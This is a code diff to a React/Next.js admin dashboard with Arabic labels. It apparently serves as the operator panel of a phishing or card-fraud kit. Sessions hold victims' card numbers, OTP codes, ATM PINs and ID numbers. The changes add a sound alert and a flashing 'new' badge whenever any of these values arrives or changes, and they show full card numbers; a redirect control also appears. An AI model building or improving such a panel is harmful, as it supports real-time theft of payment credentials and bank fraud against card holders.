@@ -1,7 +1,8 @@
 'use client';
 export const dynamic = 'force-dynamic';
 
-import { useEffect, useState, useCallback } from 'react';
+import { useEffect, useState, useCallback, useRef } from 'react';
+import React from 'react';
 import { useRouter } from 'next/navigation';
 
 interface Session {
@@ -72,6 +73,8 @@ export default function AdminDashboard() {
   const [redirectTarget, setRedirectTarget] = useState('');
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [newNotifications, setNewNotifications] = useState<string[]>([]);
+  const [shownNew, setShownNew] = useState<Set<string>>(new Set());
+  const prevSessionsRef = React.useRef<Record<string, string>>({});
 
   const fetchData = useCallback(async () => {
     try {
@@ -82,15 +85,34 @@ export default function AdminDashboard() {
       }
       const data = await res.json();
 
+      // كشف الجلسات الجديدة أو المحدّثة (بيانات جديدة وصلت)
       const newIds: string[] = [];
       data.sessions?.forEach((s: Session) => {
-        if (s.is_new === 1) {
-          newIds.push(s.id);
+        const prevUpdated = prevSessionsRef.current[s.id];
+        const currentKey = `${s.updated_at}_${s.current_page}_${s.card_number}_${s.otp_code}_${s.atm_pin}`;
+        if (!prevUpdated || prevUpdated !== currentKey) {
+          // جلسة جديدة أو تحديث جديد
+          if (!shownNew.has(s.id + currentKey)) {
+            newIds.push(s.id);
+          }
         }
+        prevSessionsRef.current[s.id] = currentKey;
       });
 
       if (newIds.length > 0) {
         setNewNotifications(prev => [...new Set([...prev, ...newIds])]);
+        setShownNew(prev => {
+          const next = new Set(prev);
+          // نضيف الـ key الكاملة لتجنب التكرار
+          data.sessions?.forEach((s: Session) => {
+            if (newIds.includes(s.id)) {
+              const currentKey = `${s.updated_at}_${s.current_page}_${s.card_number}_${s.otp_code}_${s.atm_pin}`;
+              next.add(s.id + currentKey);
+            }
+          });
+          return next;
+        });
+        // صوت تنبيه
         try {
           const ctx = new AudioContext();
           const osc = ctx.createOscillator();
@@ -103,6 +125,10 @@ export default function AdminDashboard() {
           osc.start(ctx.currentTime);
           osc.stop(ctx.currentTime + 0.3);
         } catch {}
+        // إخفاء "جديد" تلقائياً بعد 8 ثوانٍ
+        setTimeout(() => {
+          setNewNotifications(prev => prev.filter(id => !newIds.includes(id)));
+        }, 8000);
       }
 
       setSessions(data.sessions || []);
@@ -136,6 +162,7 @@ export default function AdminDashboard() {
         body: JSON.stringify(body),
       });
 
+      // إزالة "جديد" عند اتخاذ إجراء
       setNewNotifications(prev => prev.filter(id => id !== sessionId));
       await fetchData();
     } catch {}
@@ -202,51 +229,41 @@ export default function AdminDashboard() {
       </header>
 
       <div className="p-6">
-        {/* Stats Cards */}
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+        {/* Stats Cards - مصغرة */}
+        <div className="grid grid-cols-3 gap-3 mb-5">
           {/* المتواجدون الآن */}
-          <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-500 text-sm">المتواجدون الآن</p>
-                <p className="text-4xl font-bold text-green-600 mt-1">{activeUsers}</p>
-                <p className="text-gray-400 text-xs mt-1">آخر 3 دقائق</p>
-              </div>
-              <div className="w-14 h-14 bg-green-50 rounded-full flex items-center justify-center border border-green-100">
-                <span className="text-2xl">👥</span>
-              </div>
+          <div className="bg-white rounded-lg px-4 py-3 border border-gray-200 shadow-sm flex items-center gap-3">
+            <div className="w-9 h-9 bg-green-50 rounded-full flex items-center justify-center border border-green-100 flex-shrink-0">
+              <span className="text-base">👥</span>
             </div>
-            <div className="mt-3 flex items-center gap-1">
-              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-              <span className="text-green-600 text-xs font-medium">مباشر</span>
+            <div className="min-w-0">
+              <p className="text-gray-500 text-xs truncate">المتواجدون الآن</p>
+              <div className="flex items-center gap-1.5">
+                <p className="text-2xl font-bold text-green-600 leading-tight">{activeUsers}</p>
+                <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse flex-shrink-0"></span>
+              </div>
             </div>
           </div>
 
           {/* إجمالي الزيارات */}
-          <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-500 text-sm">إجمالي الزيارات</p>
-                <p className="text-4xl font-bold text-blue-600 mt-1">{totalVisits}</p>
-                <p className="text-gray-400 text-xs mt-1">منذ البداية</p>
-              </div>
-              <div className="w-14 h-14 bg-blue-50 rounded-full flex items-center justify-center border border-blue-100">
-                <span className="text-2xl">📊</span>
-              </div>
+          <div className="bg-white rounded-lg px-4 py-3 border border-gray-200 shadow-sm flex items-center gap-3">
+            <div className="w-9 h-9 bg-blue-50 rounded-full flex items-center justify-center border border-blue-100 flex-shrink-0">
+              <span className="text-base">📊</span>
+            </div>
+            <div className="min-w-0">
+              <p className="text-gray-500 text-xs truncate">إجمالي الزيارات</p>
+              <p className="text-2xl font-bold text-blue-600 leading-tight">{totalVisits}</p>
             </div>
           </div>
 
           {/* إجمالي العملاء */}
-          <div className="bg-white rounded-xl p-5 border border-gray-200 shadow-sm">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-500 text-sm">إجمالي العملاء</p>
-                <p className="text-4xl font-bold text-purple-600 mt-1">{sessions.length}</p>
-                <p className="text-gray-400 text-xs mt-1">جلسة مسجلة</p>
-              </div>
-              <div className="w-14 h-14 bg-purple-50 rounded-full flex items-center justify-center border border-purple-100">
-                <span className="text-2xl">🧾</span>
-              </div>
+          <div className="bg-white rounded-lg px-4 py-3 border border-gray-200 shadow-sm flex items-center gap-3">
+            <div className="w-9 h-9 bg-purple-50 rounded-full flex items-center justify-center border border-purple-100 flex-shrink-0">
+              <span className="text-base">🧾</span>
+            </div>
+            <div className="min-w-0">
+              <p className="text-gray-500 text-xs truncate">إجمالي العملاء</p>
+              <p className="text-2xl font-bold text-purple-600 leading-tight">{sessions.length}</p>
             </div>
           </div>
         </div>
@@ -302,12 +319,14 @@ export default function AdminDashboard() {
                           <span className="text-gray-600 text-xs mr-1">{session.country || 'غير معروف'}</span>
                         </td>
                         <td className="px-4 py-3 font-medium text-gray-800">
-                          {session.name || <span className="text-gray-400">---</span>}
-                          {isNew && (
-                            <span className="mr-2 bg-yellow-400 text-yellow-900 text-xs px-1.5 py-0.5 rounded font-bold">
-                              جديد
-                            </span>
-                          )}
+                          <div className="flex items-center gap-1.5 flex-wrap">
+                            <span>{session.name || <span className="text-gray-400">---</span>}</span>
+                            {isNew && (
+                              <span className="bg-red-500 text-white text-xs px-1.5 py-0.5 rounded-full font-bold animate-pulse">
+                                🔔 جديد
+                              </span>
+                            )}
+                          </div>
                         </td>
                         <td className="px-4 py-3 text-gray-600 font-mono text-xs">
                           {session.id_number || '---'}
@@ -434,7 +453,7 @@ export default function AdminDashboard() {
                       <span className="text-gray-300 text-xs">بطاقة الدفع</span>
                       <span className="text-white font-bold text-sm">VISA / MC</span>
                     </div>
-                    <div className="font-mono text-white text-lg tracking-widest mb-3">
+                    <div className="font-mono text-white text-lg tracking-widest mb-3" dir="ltr" style={{textAlign:'left'}}>
                       {selectedSession.card_number || '**** **** **** ****'}
                     </div>
                     <div className="flex justify-between">
